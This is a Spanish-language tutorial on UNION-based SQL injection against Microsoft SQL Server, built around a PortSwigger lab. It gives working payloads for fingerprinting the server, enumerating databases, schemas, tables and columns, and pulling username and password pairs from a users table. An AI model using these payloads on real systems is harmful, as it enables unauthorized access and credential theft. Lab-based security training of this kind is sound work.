
---
# Guía práctica: SQL Injection para enumeración en Microsoft SQL Server (MSSQL)

---

## Laboratorio Portswigger

Para ilustrar con ejemplos realistas vamos a seguir el laboratorio gratuito de Portswigger.

Todas las pruebas se realizaron en la URL (ejemplo):

```ini
https://web-security-academy.net/filter?category=Product
```

---

## Confirmación de la vulnerabilidad

**Acción:**

Comprobamos que el parámetro `port_code` es vulnerable inyectando un `UNION SELECT` simple.

```sql
' UNION SELECT 1, 'A'--
```

**Explicación:**

Si la inyección tiene éxito, la página mostrará los valores `1` y `A` en la tabla. Esto confirma que:

- La aplicación concatena directamente el valor en una consulta SQL.
    
- El número de columnas es 2 (y debemos respetar tipos: si la columna espera texto devolver 'A' o NULL).
    
- Podemos continuar con otras inyecciones más complejas adaptadas a MSSQL.
    

---

## Obtener versión de SQL Server

```sql
' UNION SELECT 1, @@VERSION--
```

**Explicación:** `@@VERSION` devuelve la versión del motor SQL Server y datos del sistema operativo.

---

## Listar todas las bases de datos

```sql
' UNION SELECT name, NULL FROM sys.databases--
```

**Explicación:** `sys.databases` lista todas las bases de datos del servidor. En entornos alojados puede haber restricciones de privilegios.

### Listar schemas en la DB actual

En SQL Server diferenciamos bases de datos y schemas. Para listar schemas en la base de datos actual:

```sql
' UNION SELECT NULL, name FROM sys.schemas--
```

---

## Limit / Paginación

En SQL Server tenemos varias formas de limitar o paginar resultados según la versión:

- **TOP**: sintaxis clásica para limitar el número de filas devueltas. No admite `OFFSET` por sí solo.
    
- **OFFSET / FETCH**: disponible desde SQL Server 2012; requiere `ORDER BY`.
    
- **ROW_NUMBER()**: técnica universal para simular offset cuando `OFFSET/FETCH` no está disponible.
    

### Ejemplos con `TOP`

- Obtener la primera base de datos (alfabéticamente):
    

```sql
' UNION SELECT NULL, (SELECT TOP 1 name FROM sys.databases ORDER BY name) --
```

- Obtener las 5 primeras tablas (sin orden garantizado si no ponemos `ORDER BY`):
    

```sql
' UNION SELECT NULL, (SELECT TOP 5 name FROM sys.tables) --
```

> Nota: `TOP` devuelve las N primeras filas, pero **no** permite desplazamiento (offset) por sí mismo. Para paginar con desplazamiento necesitamos `ROW_NUMBER()` o `OFFSET/FETCH`.

### Ejemplos con `OFFSET/FETCH` (SQL Server 2012+)

- Obtener la primera fila (offset 0):
    

```sql
' UNION SELECT NULL, name FROM sys.tables WHERE schema_id = SCHEMA_ID('dbo') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY--
```

- Iterar cambiando `OFFSET 0` → `OFFSET 1`, etc.
    

### Ejemplo con `ROW_NUMBER()` (simular offset en versiones antiguas)

- Obtener la fila con número 1 (se puede cambiar a rn = 2, 3, ...):
    

```sql
' UNION SELECT NULL, (
  SELECT name FROM (
    SELECT name, ROW_NUMBER() OVER (ORDER BY name) rn FROM sys.tables WHERE schema_id = SCHEMA_ID('dbo')
  ) t WHERE rn = 1
) --
```

**Resumen rápido:**

- Usar `TOP` para límites rápidos sin offset.
    
- Usar `OFFSET/FETCH` cuando esté disponible y queramos paginar de forma simple.
    
- Usar `ROW_NUMBER()` cuando necesitemos compatibilidad o simular offset sin `OFFSET/FETCH`.
    

---

## Equivalente a `GROUP_CONCAT` (concatenar filas en una sola)

- **SQL Server 2017+**: `STRING_AGG(column, ',')`.
    

```sql
' UNION SELECT NULL, (SELECT STRING_AGG(name, ',') FROM sys.tables WHERE schema_id = SCHEMA_ID('dbo'))--
```

- **Versiones anteriores**: usar `FOR XML PATH('')` + `STUFF`:
    

```sql
' UNION SELECT NULL, (
  SELECT STUFF((SELECT ',' + name FROM sys.tables WHERE schema_id = SCHEMA_ID('dbo') FOR XML PATH('')), 1, 1, '')
)--
```

**Explicación:** `FOR XML PATH('')` concatena filas como XML; `STUFF` elimina la coma inicial.

---

## Ejemplos de payloads (concepto)

> Usamos aquí la forma `UNION SELECT NULL, <subconsulta>`, que es más robusta si desconocemos el tipo de la primera columna.

- **Obtener la base de datos actual:**
    

```sql
' UNION SELECT NULL, DB_NAME()--
```

- **Listar tablas del schema dbo (concatenadas, si STRING_AGG disponible):**
    

```sql
' UNION SELECT NULL, (SELECT STRING_AGG(name, ',') FROM sys.tables WHERE schema_id = SCHEMA_ID('dbo'))--
```

- **Listar tablas fila a fila (OFFSET/FETCH):**
    

```sql
' UNION SELECT NULL, name FROM sys.tables WHERE schema_id = SCHEMA_ID('dbo') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY--
```

---

## Cadenas hexadecimales y conversión

En SQL Server podemos usar literales hex `0x...` o `CONVERT`/`CAST` para transformar datos.

- Insertar una cadena desde hex:
    

```sql
SELECT CONVERT(VARCHAR(100), 0x7065626C6963); -- ejemplo de conversión hex -> texto
```

- En un payload:
    

```sql
' UNION SELECT NULL, (SELECT name FROM sys.schemas WHERE name = CONVERT(VARCHAR(100), 0x5045544552)) --
```

---

## Listar columnas de una tabla

- Usando `INFORMATION_SCHEMA.COLUMNS`:
    

```sql
' UNION SELECT NULL, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'PRODUCT' AND TABLE_SCHEMA = 'dbo'--
```

- Usando catálogo de sistema (`sys.columns`):
    

```sql
' UNION SELECT NULL, c.name FROM sys.columns c JOIN sys.tables t ON c.object_id = t.object_id WHERE t.name = 'PRODUCT' AND SCHEMA_NAME(t.schema_id) = 'dbo'--
```

---

## Extraer datos de una tabla `users` (ejemplo)

Si existe una tabla de aplicación `users`:

```sql
' UNION SELECT username, password FROM users--
```

Si la estructura de columnas de la consulta original no coincide:

```sql
' UNION SELECT NULL, username + ':' + password FROM users--
```

---

## Consideraciones y buenas prácticas pedagógicas

- Adaptar el payload al número y tipos de columnas de la consulta vulnerable (usar `NULL` cuando sea necesario).
    
- Probar primero con valores constantes (`'TEST'`, `1`) para confirmar la estructura.
    
- Usar `STRING_AGG` si está disponible; si no, usar `FOR XML PATH('') + STUFF`.
    
- Para automatizar enumeración fila a fila preferimos `OFFSET/FETCH` o `ROW_NUMBER()` según la versión.
    
- Comprobar el `SCHEMA` (p. ej. `dbo`) y el `USER` actual (`SUSER_SNAME()` o `CURRENT_USER`) antes de filtrar por owner/schema.
    
- Documentar cada paso en el laboratorio y no realizar pruebas fuera de entornos autorizados.
    

---

## Versiones (breve guía de compatibilidad)

- **SQL Server < 2012:**
    
    - `OFFSET/FETCH` no está disponible.
        
    - Usar `TOP` y `ROW_NUMBER()` para paginación.
        
    - `STRING_AGG` no está disponible; usar `FOR XML PATH('') + STUFF` para concatenar filas.
        
- **SQL Server 2012–2016:**
    
    - `OFFSET/FETCH` está disponible (desde 2012).
        
    - `STRING_AGG` aún **no** está disponible en versiones anteriores a 2017.
        
    - `ROW_NUMBER()` y `FOR XML PATH` funcionan y son útiles para paginación y concatenación.
        
- **SQL Server 2017 y superiores:**
    
    - `STRING_AGG` disponible y recomendable para concatenaciones simples.
        
    - `OFFSET/FETCH` y `ROW_NUMBER()` también están disponibles.
        


---